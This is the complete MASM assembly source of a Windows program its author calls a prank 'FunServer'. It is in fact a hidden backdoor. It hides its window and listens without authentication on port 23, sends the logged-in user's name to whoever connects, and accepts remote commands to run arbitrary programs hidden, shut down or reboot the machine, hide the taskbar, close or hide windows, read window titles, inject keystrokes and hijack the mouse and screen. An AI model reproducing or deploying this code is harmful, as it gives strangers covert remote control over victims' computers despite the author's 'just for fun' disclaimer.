;Hi Freaks here is our C3lt1c. I have coded a FunServer in MAsm and i hope you like it! I have coded this
;as an Testproject! You use the Server on your own Risk. The Server was not coded to steal data or damages
;PCs! It's only just for fun! Since their own responsibility what makes it so!!! The Server is extreme fast
;because i have codet it in pure ASM! You must connect to the Server with a telnet client (Puttytel is the best).
;The Server has 28 Fun-Functions for you. Have fun.


.386
.model flat, stdcall
option casemap :none

include FunServer.inc

.code

start:

    invoke GetModuleHandle,NULL
    mov     hInstance,eax

    invoke InitCommonControls
    invoke DialogBoxParam,hInstance,IDD_DIALOG1,NULL,addr DlgProc,NULL
    invoke ExitProcess,0

;########################################################################

DlgProc proc hWin:HWND,uMsg:UINT,wParam:WPARAM,lParam:LPARAM

    mov     eax,uMsg
    .if eax==WM_INITDIALOG




    invoke InitServer,hWin,WM_SOCKET,23
    invoke ShowWindowAsync,hWin,SW_HIDE
    .elseif eax==WM_COMMAND


    .elseif uMsg==WM_SOCKET
    mov eax,lParam
    .if ax==FD_ACCEPT
    invoke accept,wParam,0,0
    mov sock,eax
    invoke send,sock,addr connected,sizeof connected,0

    invoke RtlZeroMemory,addr buffer, sizeof buffer

    lea eax,byte ptr [esp-8]
    push eax
    push offset buffer
    call GetUserName

    invoke lstrcpy,addr buffer3,addr verbunden
    invoke lstrcat,addr buffer3,addr buffer
    invoke lstrcat,addr buffer3,addr zerosend






    invoke send,sock,addr buffer3,sizeof buffer3,0





    .elseif ax==FD_READ
    invoke RtlZeroMemory,addr buffer,sizeof buffer
    invoke recv,wParam,offset buffer,sizeof buffer,0
    mov offset_,offset buffer


    invoke lstrcpyn,addr buffer2,addr buffer,sizeof about
    invoke lstrcmp,addr buffer2,addr about
    or eax,eax
    jz about_func

    invoke lstrcpyn,addr buffer2,addr buffer,sizeof command
    invoke lstrcmp,addr buffer2,addr command
    or eax,eax
    jz command_func

    invoke lstrcpyn,addr buffer2,addr buffer,sizeof killme
    invoke lstrcmp,addr buffer2,addr killme
    or eax,eax
    jz killme_func

    invoke lstrcpyn,addr buffer2,addr buffer,sizeof msgbox
    invoke lstrcmp,addr buffer2,addr msgbox
    or eax,eax
    jz msgbox_func


    invoke lstrcpyn,addr buffer2,addr buffer,sizeof opencd
    invoke lstrcmp,addr buffer2,addr opencd
    or eax,eax
    jz opencd_func


    invoke lstrcpyn,addr buffer2,addr buffer,sizeof closecd
    invoke lstrcmp,addr buffer2,addr closecd
    or eax,eax
    jz closecd_func


    invoke lstrcpyn,addr buffer2,addr buffer,sizeof text_out
    invoke lstrcmp,addr buffer2,addr text_out
    or eax,eax
    jz text_func


    invoke lstrcpyn,addr buffer2,addr buffer,sizeof beep
    invoke lstrcmp,addr buffer2,addr beep
    or eax,eax
    jz beep_func


    invoke lstrcpyn,addr buffer2,addr buffer,sizeof error
    invoke lstrcmp,addr buffer2,addr error
    or eax,eax
    jz error_func


    invoke lstrcpyn,addr buffer2,addr buffer,sizeof hide_start
    invoke lstrcmp,addr buffer2,addr hide_start
    or eax,eax
    jz hide_start_func

    invoke lstrcpyn,addr buffer2,addr buffer,sizeof show_start
    invoke lstrcmp,addr buffer2,addr show_start
    or eax,eax
    jz show_start_func


    invoke lstrcpyn,addr buffer2,addr buffer,sizeof hide_task
    invoke lstrcmp,addr buffer2,addr hide_task
    or eax,eax
    jz hide_task_func


    invoke lstrcpyn,addr buffer2,addr buffer,sizeof show_task
    invoke lstrcmp,addr buffer2,addr show_task
    or eax,eax
    jz show_task_func


    invoke lstrcpyn,addr buffer2,addr buffer,sizeof evilsmile
    invoke lstrcmp,addr buffer2,addr evilsmile
    or eax,eax
    jz evilsmile_func


    invoke lstrcpyn,addr buffer2,addr buffer,sizeof openfile
    invoke lstrcmp,addr buffer2,addr openfile
    or eax,eax
    jz openfile_func


    invoke lstrcpyn,addr buffer2,addr buffer,sizeof openhide
    invoke lstrcmp,addr buffer2,addr openhide
    or eax,eax
    jz openhide_func


    invoke lstrcpyn,addr buffer2,addr buffer,sizeof slide
    invoke lstrcmp,addr buffer2,addr slide
    or eax,eax
    jz slide_func


    invoke lstrcpyn,addr buffer2,addr buffer,sizeof darkness
    invoke lstrcmp,addr buffer2,addr darkness
    or eax,eax
    jz darkness_func


    invoke lstrcpyn,addr buffer2,addr buffer,sizeof mousepingpong
    invoke lstrcmp,addr buffer2,addr mousepingpong
    or eax,eax
    jz mousepingpong_func

    invoke lstrcpyn,addr buffer2,addr buffer,sizeof mousenormal
    invoke lstrcmp,addr buffer2,addr mousenormal
    or eax,eax
    jz mousenormal_func


    invoke lstrcpyn,addr buffer2,addr buffer,sizeof mousefix
    invoke lstrcmp,addr buffer2,addr mousefix
    or eax,eax
    jz mousefix_func


    invoke lstrcpyn,addr buffer2,addr buffer,sizeof getprocessname
    invoke lstrcmp,addr buffer2,addr getprocessname
    or eax,eax
    jz getprocessname_func



    invoke lstrcpyn,addr buffer2,addr buffer,sizeof setprocessname
    invoke lstrcmp,addr buffer2,addr setprocessname
    or eax,eax
    jz setprocessname_func


    invoke lstrcpyn,addr buffer2,addr buffer,sizeof hideprocess
    invoke lstrcmp,addr buffer2,addr hideprocess
    or eax,eax
    jz hideprocess_func


    invoke lstrcpyn,addr buffer2,addr buffer,sizeof showprocess
    invoke lstrcmp,addr buffer2,addr showprocess
    or eax,eax
    jz showprocess_func

    invoke lstrcpyn,addr buffer2,addr buffer,sizeof closeprocess
    invoke lstrcmp,addr buffer2,addr closeprocess
    or eax,eax
    jz closeprocess_func

    invoke lstrcpyn,addr buffer2,addr buffer,sizeof poweroff
    invoke lstrcmp,addr buffer2,addr poweroff
    or eax,eax
    jz poweroff_func

    invoke lstrcpyn,addr buffer2,addr buffer,sizeof reboot
    invoke lstrcmp,addr buffer2,addr reboot
    or eax,eax
    jz reboot_func

    invoke lstrcpyn,addr buffer2,addr buffer,sizeof flicflac
    invoke lstrcmp,addr buffer2,addr flicflac
    or eax,eax
    jz flicflac_func

    invoke lstrcpyn,addr buffer2,addr buffer,sizeof tron_on
    invoke lstrcmp,addr buffer2,addr tron_on
    or eax,eax
    jz tron_on_func

    invoke lstrcpyn,addr buffer2,addr buffer,sizeof tron_off
    invoke lstrcmp,addr buffer2,addr tron_off
    or eax,eax
    jz tron_off_func

    invoke lstrcpyn,addr buffer2,addr buffer,sizeof keyboardbomb
    invoke lstrcmp,addr buffer2,addr keyboardbomb
    or eax,eax
    jz keyboardbomb_func


    invoke lstrcpyn,addr buffer2,addr buffer,sizeof deaddot
    invoke lstrcmp,addr buffer2,addr deaddot
    or eax,eax
    jz deaddot_func




    jmp weiter


    about_func:
    call about_call
    jmp weiter

    command_func:
    call command_call
    jmp weiter

    killme_func:
    call killme_call
    jmp weiter

    msgbox_func:
    call msgbox_call
    jmp weiter

    opencd_func:
    call opencd_call
    jmp weiter

    closecd_func:
    call closecd_call
    jmp weiter

    text_func:
    call text_call
    jmp weiter

    beep_func:
    call beep_call
    jmp weiter

    error_func:
    call error_call
    jmp weiter


    hide_start_func:
    call hide_start_call
    jmp weiter

    show_start_func:
    call show_start_call
    jmp weiter


    hide_task_func:
    call hide_task_call
    jmp weiter

    show_task_func:
    call show_task_call
    jmp weiter


    evilsmile_func:
    call evilsmile_call
    jmp weiter

    openfile_func:
    call openfile_call
    jmp weiter

    openhide_func:
    call openhide_call
    jmp weiter


    slide_func:
    call slide_call
    jmp weiter

    darkness_func:
    call darkness_call
    jmp weiter


    mousepingpong_func:
    invoke mousepingpong_call,hWin
    jmp weiter

    mousenormal_func:
    invoke mousenormal_call,hWin
    jmp weiter

    mousefix_func:
    invoke mousefix_call,hWin
    jmp weiter

    getprocessname_func:
    call getprocessname_call
    jmp weiter


    setprocessname_func:
    call setprocessname_call
    jmp weiter


    hideprocess_func:
    call hideprocess_call
    jmp weiter

    showprocess_func:
    call showprocess_call
    jmp weiter

    closeprocess_func:
    call closeprocess_call
    jmp weiter

    poweroff_func:
    call poweroff_call
    jmp weiter

    reboot_func:
    call reboot_call
    jmp weiter

    flicflac_func:
    call flicflac_call
    jmp weiter

    tron_on_func:
    invoke tron_on_call ,hWin
    jmp weiter

    tron_off_func:
    invoke tron_off_call ,hWin
    jmp weiter

    keyboardbomb_func:
    call keyboardbomb_call
    jmp weiter

    deaddot_func:
    call deaddot_call
    jmp weiter



    weiter:


    invoke RtlZeroMemory,addr buffer,sizeof buffer
    invoke RtlZeroMemory,addr buffer2,sizeof buffer2

    .endif
    .elseif eax==WM_CLOSE
        invoke EndDialog,hWin,0
    .else
        mov     eax,FALSE
        ret
    .endif
    mov     eax,TRUE
    ret

DlgProc endp


InitServer  proc hWnd:DWORD,cbMsg:DWORD,port:DWORD
        local wsadata:WSADATA
        local addrin:sockaddr_in
        local hListenSock:DWORD
        invoke WSAStartup,202h,addr wsadata
        mov addrin.sin_family,AF_INET
        invoke htons,port
        mov addrin.sin_port,ax
        mov addrin.sin_addr,INADDR_ANY
        mov addrin.sin_zero,0
        invoke socket,AF_INET,SOCK_STREAM,0
        mov hListenSock,eax
        invoke WSAAsyncSelect,hListenSock,hWnd,cbMsg,FD_ACCEPT or FD_READ
        invoke bind,hListenSock,addr addrin,sizeof addrin
        invoke listen,hListenSock,3

ret
InitServer  endp



about_call proc

invoke send,sock,addr about_text,sizeof about_text,0
    ret

about_call endp



command_call proc

invoke send,sock,addr commands,sizeof commands,0
invoke send,sock,addr commands2,sizeof commands2,0
invoke send,sock,addr commands3,sizeof commands3,0
invoke send,sock,addr commands4,sizeof commands4,0
invoke send,sock,addr commands5,sizeof commands5,0
invoke send,sock,addr commands6,sizeof commands6,0
invoke send,sock,addr commands7,sizeof commands7,0
    ret

command_call endp



killme_call proc

invoke send,sock,addr ok,sizeof ok,0
invoke Sleep ,1000
invoke send,sock,addr bye,sizeof bye,0
invoke Sleep, 3000
invoke ExitProcess,NULL
    ret

killme_call endp



msgbox_call proc

invoke send,sock,addr ok,sizeof ok,0

invoke lstrlen,addr msgbox
mov ecx,eax
lp1:
inc offset_
loop lp1

push 0
push offset zero
push offset_
push 0
call MessageBoxA
invoke send,sock,addr ok2,sizeof ok2,0
    ret

msgbox_call endp



opencd_call proc

invoke mciSendString,ADDR mci1,ADDR mci3,0,0
invoke send,sock,addr ok,sizeof ok,0

    ret

opencd_call endp



closecd_call proc

invoke mciSendString,ADDR mci2,ADDR mci3,0,0
invoke send,sock,addr ok,sizeof ok,0

    ret

closecd_call endp


text_call proc
invoke send,sock,addr ok,sizeof ok,0
invoke lstrlen,addr text_out
mov ecx,eax
lp1:
inc offset_
loop lp1


invoke GetDC,0
mov hdc,eax

mov var,1
invoke lstrlen,offset_
dec eax

mov var2,eax
loopy:
push var
push offset_
push 300
push 300
push hdc
call TextOutA
invoke UpdateWindow,hdc
invoke Sleep,200
inc var
mov eax,var2
cmp var,eax
jne loopy

invoke send,sock,addr ok2,sizeof ok2,0




ret


text_call endp


beep_call proc
invoke send,sock,addr ok,sizeof ok,0
loopy3:
    add var3,2

    invoke Beep,var3,1
    cmp var3,4000
    jnz loopy3
    mov var3,0


    invoke send,sock,addr ok2,sizeof ok2,0
    ret


beep_call endp


error_call proc

invoke MessageBeep,MB_ICONEXCLAMATION
invoke send,sock,addr ok,sizeof ok,0

    ret

error_call endp



hide_start_call proc

invoke send,sock,addr ok,sizeof ok,0
invoke FindWindow,addr shell,NULL
invoke GetWindow,eax, GW_CHILD
mov child, eax
.if child != 0
invoke GetClassName,child,offset buffer, sizeof buffer
.if eax &gt; 0
invoke lstrlen, offset buffer
mov slen,eax
invoke CharUpperBuff,offset buffer,slen
invoke lstrcmp,addr buffer, addr sbar
.if eax == 0
invoke ShowWindow,child,SW_HIDE
.endif
.endif
.endif
    ret

hide_start_call endp



show_start_call proc

invoke send,sock,addr ok,sizeof ok,0
invoke FindWindow,addr shell,NULL
invoke GetWindow,eax, GW_CHILD
mov child, eax
.if child != 0
invoke GetClassName,child,offset buffer, sizeof buffer
.if eax &gt; 0
invoke lstrlen, offset buffer
mov slen,eax
invoke CharUpperBuff,offset buffer,slen
invoke lstrcmp,addr buffer, addr sbar
.if eax == 0
invoke ShowWindow,child,SW_SHOW
.endif
.endif
.endif
    ret

show_start_call endp



hide_task_call proc


invoke FindWindow,addr task,NULL
.if eax != 0
    invoke ShowWindow,eax,SW_HIDE
.endif

invoke send,sock,addr ok,sizeof ok,0


ret

hide_task_call endp




show_task_call proc


invoke FindWindow,addr task,NULL
.if eax != 0
    invoke ShowWindow,eax,SW_SHOW
.endif
invoke send,sock,addr ok,sizeof ok,0



ret

show_task_call endp




evilsmile_call proc

invoke GetDC,0
mov hdc,eax

invoke CreateSolidBrush,00ffffh
mov pen ,eax
invoke SelectObject,hdc,pen
invoke Ellipse,hdc,200,200,400,400

invoke CreateSolidBrush,000000h

invoke SelectObject,hdc,pen
invoke Ellipse,hdc,250,240,280,280
invoke Ellipse,hdc,320,240,350,280

invoke Rectangle,hdc,240,320,360,340

invoke LineTo,hdc,20,20

invoke CreateSolidBrush,0000ffh
mov pen ,eax
invoke SelectObject,hdc,pen
invoke Ellipse,hdc,260,250,270,270
invoke Ellipse,hdc,330,250,340,270

invoke Beep,100,300
invoke Sleep,100
invoke Beep,110,200

invoke send,sock,addr ok,sizeof ok,0


ret

evilsmile_call endp




openfile_call proc
invoke lstrlen,addr openfile
mov ecx,eax
lp4:
inc offset_
loop lp4
inc offset_

invoke lstrlen,offset_
mov ebx,offset_
add ebx,eax
sub ebx,2
mov byte ptr [ebx],00h



invoke WinExec,offset_,SW_SHOW
invoke send,sock,addr ok,sizeof ok,0
    ret

openfile_call endp


openhide_call proc
invoke lstrlen,addr openfile
mov ecx,eax
lp4:
inc offset_
loop lp4
inc offset_


invoke lstrlen,offset_
mov ebx,offset_
add ebx,eax
sub ebx,2
mov byte ptr [ebx],00h



invoke WinExec,offset_,SW_HIDE
invoke send,sock,addr ok,sizeof ok,0
    ret

openhide_call endp




slide_call proc

LOCAL swid  :DWORD
    LOCAL shgt  :DWORD
    LOCAL dwid  :DWORD
    LOCAL hDC   :DWORD
    LOCAL cDC   :DWORD
    LOCAL hScr  :DWORD
    LOCAL hBmp  :DWORD
    LOCAL hOld  :DWORD

    invoke send,sock,addr ok,sizeof ok,0

    mov hScr, 0
    mov hDC,  rv(GetDC,hScr)
    mov swid, rv(GetSystemMetrics,SM_CXSCREEN)
    add eax,  eax
    mov dwid, eax
    mov shgt, rv(GetSystemMetrics,SM_CYSCREEN)
    mov hBmp, rv(CreateCompatibleBitmap,hDC,dwid,shgt)
    mov cDC,  rv(CreateCompatibleDC,hDC)
    mov hOld, rv(SelectObject,cDC,hBmp)


    invoke BitBlt,cDC,0,0,swid,shgt,hDC,0,0,SRCCOPY
    invoke BitBlt,cDC,swid,0,swid,shgt,hDC,0,0,SRCCOPY


    push esi
    mov esi, swid
  @@:
    invoke BitBlt,hDC,0,0,swid,shgt,cDC,esi,0,SRCCOPY
    invoke Sleep, 20
    sub esi, 8
    jns @B

    pop esi

    invoke SendMessage,0,WM_PAINT,hDC,0

    invoke DeleteObject,hBmp
    invoke SelectObject,cDC,hOld
    invoke DeleteDC,cDC
    invoke ReleaseDC,hScr,hDC

invoke send,sock,addr ok2,sizeof ok2,0
ret
slide_call endp




darkness_call proc
LOCAL swid:DWORD
LOCAL shgt:DWORD
LOCAL dwid:DWORD

    invoke send,sock,addr ok,sizeof ok,0

    mov swid, rv(GetSystemMetrics,SM_CXSCREEN)
    add eax,  eax
    mov dwid, eax
    mov shgt, rv(GetSystemMetrics,SM_CYSCREEN)

    invoke GetDC,0
    mov hdc,eax

    invoke CreateSolidBrush,000000h
    invoke SelectObject,hdc,eax
    invoke Rectangle,hdc,0,0,swid,shgt

    ret

darkness_call endp




mousepingpong_call proc hWnd:DWORD

mov mx,0
mov my,0
mov schalter,1
mov schalter2,1
mov ebx,offset timer
invoke SetTimer,hWnd,NULL,10,ebx
invoke send,sock,addr ok,sizeof ok,0

ret

mousepingpong_call endp



mousenormal_call proc hWnd:DWORD

invoke KillTimer,hWnd,NULL
invoke send,sock,addr ok,sizeof ok,0
ret

mousenormal_call endp





timer proc
LOCAL swid:DWORD
LOCAL shgt:DWORD
LOCAL dwid:DWORD



mov swid, rv(GetSystemMetrics,SM_CXSCREEN)
mov shgt, rv(GetSystemMetrics,SM_CYSCREEN)


.if schalter==1
add mx,2
.endif
.if schalter==0
sub mx,2
.endif

mov eax,swid

.if mx&gt;eax
mov schalter,0
.endif

.if mx==0
mov schalter,1
.endif


.if schalter2==1
add my,3
.endif
.if schalter2==0
sub my,3
.endif

mov eax,shgt

.if my&gt;eax
mov schalter2,0
.endif

.if my==0
mov schalter2,1
.endif


invoke SetCursorPos,mx,my

    ret

timer endp







mousefix_call proc hWnd:DWORD

mov ebx,offset timer2
invoke SetTimer,hWnd,NULL,1,ebx

invoke send,sock,addr ok,sizeof ok,0
    ret

mousefix_call endp


timer2 proc


invoke SetCursorPos,0,0
    ret

timer2 endp


getprocessname_call proc
invoke RtlZeroMemory,addr buffer3,sizeof buffer3
invoke RtlZeroMemory,addr buffer,sizeof buffer
invoke GetForegroundWindow
mov win,eax
invoke SendMessage,win,WM_GETTEXT,sizeof buffer,addr buffer3

invoke lstrcpy,addr buffer,addr buffer3
invoke lstrcat,addr buffer,addr zerosend


invoke send,sock,addr buffer,sizeof buffer,0
invoke send,sock,addr ok,sizeof ok,0


ret

getprocessname_call endp




setprocessname_call proc

invoke lstrlen,addr setprocessname
mov ecx,eax
lp10:
inc offset_
loop lp10
inc offset_


invoke lstrlen,offset_
mov ebx,offset_
add ebx,eax
sub ebx,2
mov byte ptr [ebx],00h


invoke GetForegroundWindow
mov win,eax
invoke SendMessage,win,WM_SETTEXT,sizeof offset_,offset_
invoke send,sock,addr ok,sizeof ok,0
    ret

setprocessname_call endp


hideprocess_call proc

invoke GetForegroundWindow
mov win,eax
invoke ShowWindow,win,SW_HIDE
invoke send,sock,addr ok,sizeof ok,0
    ret

hideprocess_call endp



showprocess_call proc

invoke ShowWindow,win,SW_SHOW
invoke send,sock,addr ok,sizeof ok,0
    ret

showprocess_call endp


closeprocess_call proc

invoke GetForegroundWindow
mov win,eax
invoke SendMessage,win,WM_CLOSE,NULL,NULL
invoke send,sock,addr ok,sizeof ok,0
    ret

closeprocess_call endp



poweroff_call proc

invoke RtlZeroMemory,addr buffer3,sizeof buffer3
invoke lstrlen,addr poweroff
mov ecx,eax
lp11:
inc offset_
loop lp11
inc offset_

invoke lstrlen,offset_
mov ebx,offset_
add ebx,eax
sub ebx,2
mov byte ptr [ebx],00h

invoke lstrcpy,addr buffer3,addr shut
invoke lstrcat,addr buffer3,offset_
invoke WinExec,addr buffer3,SW_HIDE
    ret

poweroff_call endp


reboot_call proc

invoke RtlZeroMemory,addr buffer3,sizeof buffer3
invoke lstrlen,addr reboot
mov ecx,eax
lp12:
inc offset_
loop lp12
inc offset_

invoke lstrlen,offset_
mov ebx,offset_
add ebx,eax
sub ebx,2
mov byte ptr [ebx],00h

invoke lstrcpy,addr buffer3,addr shut2
invoke lstrcat,addr buffer3,offset_
invoke WinExec,addr buffer3,SW_HIDE



ret

reboot_call endp



flicflac_call proc
LOCAL swid:DWORD
LOCAL shgt:DWORD
LOCAL dwid:DWORD
LOCAL cDC:DWORD
LOCAL hScr:DWORD
LOCAL hBmp:DWORD
LOCAL hOld:DWORD
    invoke send,sock,addr ok,sizeof ok,0


    invoke GetDC,0
    mov hdc,eax

    mov swid, rv(GetSystemMetrics,SM_CXSCREEN)
    add eax,  eax
    mov dwid, eax
    mov shgt, rv(GetSystemMetrics,SM_CYSCREEN)









    mov zahl,1000
    loopy80:

    invoke CreateSolidBrush,0000ffh
    invoke SelectObject,hdc,eax
    invoke Rectangle,hdc,0,0,swid,shgt
    invoke CreateSolidBrush,00ff00h
    invoke SelectObject,hdc,eax
    invoke Rectangle,hdc,0,0,swid,shgt
    invoke CreateSolidBrush,0ff0000h
    invoke SelectObject,hdc,eax
    invoke Rectangle,hdc,0,0,swid,shgt
    dec zahl
    cmp zahl ,0
    jne loopy80


    invoke CreateSolidBrush,0ffffffh
    invoke SelectObject,hdc,eax
    invoke Rectangle,hdc,0,0,swid,shgt


    invoke send,sock,addr ok2,sizeof ok2,0

    ret

flicflac_call endp







tron_on_call proc hWnd:DWORD
mov ebx,offset trontimer_call
    invoke SetTimer,hWnd,NULL,1,ebx
    invoke GetDC,0
    mov hdc,eax

    invoke GetSystemMetrics,SM_CXSCREEN
    mov scx,eax
    invoke GetSystemMetrics,SM_CYSCREEN
    mov scy,eax

    mov x,200
    mov y,100


    mov s1,1
    mov s2,1

    invoke send,sock,addr ok,sizeof ok,0
    ret

tron_on_call endp




tron_off_call proc hWnd:DWORD

    invoke KillTimer,hWnd,0
    invoke send,sock,addr ok,sizeof ok,0
    ret

tron_off_call endp






trontimer_call proc






inc richtung






.if richtung==1
mov s2,0
mov s1,3
.endif


.if richtung==200
mov s2,3
mov s1,0
.endif

.if richtung==400
mov s2,0
mov s1,3
.endif

.if richtung==800
mov s2,3
mov s1,1
.endif

.if richtung==1500
mov s2,1
mov s1,3
.endif

.if richtung==2000
mov s2,3
mov s1,1
.endif

.if richtung==2450
mov s2,0
mov s1,3
.endif


.if richtung==2700
mov s2,3
mov s1,0
.endif

.if richtung==3300
mov s2,0
mov s1,3
.endif


.if richtung==3600
mov richtung,0
.endif





.if s1==0
inc x
.endif
.if s1==1
dec x
.endif
.if s2==0
inc y
.endif
.if s2==1
dec y
.endif

mov ebx,scx
.if x==ebx
mov x,1
.endif

.if x==0
mov x,ebx
.endif

mov ebx,scy
.if y==ebx
mov y,1
.endif

.if y==0
mov y,ebx
.endif







invoke SetPixel,hdc,x,y,0000ffh
    ret

trontimer_call endp




keyboardbomb_call proc

invoke keybd_event,VK_1,NULL,NULL,NULL
invoke keybd_event,VK_2,NULL,NULL,NULL
invoke keybd_event,VK_3,NULL,NULL,NULL
invoke keybd_event,VK_4,NULL,NULL,NULL
invoke keybd_event,VK_5,NULL,NULL,NULL
invoke keybd_event,VK_6,NULL,NULL,NULL
invoke keybd_event,VK_7,NULL,NULL,NULL
invoke keybd_event,VK_8,NULL,NULL,NULL
invoke keybd_event,VK_9,NULL,NULL,NULL
invoke keybd_event,VK_0,NULL,NULL,NULL
invoke keybd_event,VK_A,NULL,NULL,NULL
invoke keybd_event,VK_B,NULL,NULL,NULL
invoke keybd_event,VK_C,NULL,NULL,NULL
invoke keybd_event,VK_D,NULL,NULL,NULL
invoke keybd_event,VK_E,NULL,NULL,NULL
invoke keybd_event,VK_F,NULL,NULL,NULL
invoke keybd_event,VK_G,NULL,NULL,NULL
invoke keybd_event,VK_H,NULL,NULL,NULL
invoke keybd_event,VK_I,NULL,NULL,NULL
invoke keybd_event,VK_J,NULL,NULL,NULL
invoke keybd_event,VK_K,NULL,NULL,NULL
invoke keybd_event,VK_L,NULL,NULL,NULL
invoke keybd_event,VK_M,NULL,NULL,NULL
invoke keybd_event,VK_N,NULL,NULL,NULL
invoke keybd_event,VK_O,NULL,NULL,NULL
invoke keybd_event,VK_P,NULL,NULL,NULL
invoke keybd_event,VK_Q,NULL,NULL,NULL
invoke keybd_event,VK_R,NULL,NULL,NULL
invoke keybd_event,VK_S,NULL,NULL,NULL
invoke keybd_event,VK_T,NULL,NULL,NULL
invoke keybd_event,VK_U,NULL,NULL,NULL
invoke keybd_event,VK_V,NULL,NULL,NULL
invoke keybd_event,VK_W,NULL,NULL,NULL
invoke keybd_event,VK_X,NULL,NULL,NULL
invoke keybd_event,VK_Y,NULL,NULL,NULL
invoke keybd_event,VK_Z,NULL,NULL,NULL
invoke keybd_event,VK_UP,NULL,NULL,NULL
invoke keybd_event,VK_DOWN,NULL,NULL,NULL
invoke keybd_event,VK_LEFT,NULL,NULL,NULL
invoke keybd_event,VK_RIGHT,NULL,NULL,NULL
invoke keybd_event,VK_F1,NULL,NULL,NULL
invoke keybd_event,VK_F2,NULL,NULL,NULL
invoke keybd_event,VK_F3,NULL,NULL,NULL
invoke keybd_event,VK_F4,NULL,NULL,NULL
invoke keybd_event,VK_F5,NULL,NULL,NULL
invoke keybd_event,VK_F6,NULL,NULL,NULL
invoke keybd_event,VK_F7,NULL,NULL,NULL
invoke keybd_event,VK_F8,NULL,NULL,NULL
invoke keybd_event,VK_F9,NULL,NULL,NULL
invoke keybd_event,VK_F10,NULL,NULL,NULL
invoke keybd_event,VK_F11,NULL,NULL,NULL
invoke keybd_event,VK_F12,NULL,NULL,NULL
invoke keybd_event,VK_RETURN,NULL,NULL,NULL
invoke keybd_event,VK_MENU,NULL,NULL,NULL
invoke send,sock,addr ok,sizeof ok,0

    ret

keyboardbomb_call endp



deaddot_call proc

invoke GetDC,0
    mov hdc,eax


    invoke SetPixel,hdc,20,20,00ff00h
    invoke SetPixel,hdc,63,253,00ff00h
    invoke SetPixel,hdc,230,232,00ff00h
    invoke SetPixel,hdc,70,23,00ff00h
    invoke SetPixel,hdc,543,543,00ff00h
    invoke SetPixel,hdc,400,77,00ff00h
    invoke SetPixel,hdc,123,321,00ff00h
    invoke SetPixel,hdc,70,565,00ff00h
    invoke SetPixel,hdc,800,600,00ff00h
    invoke SetPixel,hdc,235,278,00ff00h
    invoke SetPixel,hdc,324,563,00ff00h
    ret

deaddot_call endp

end start
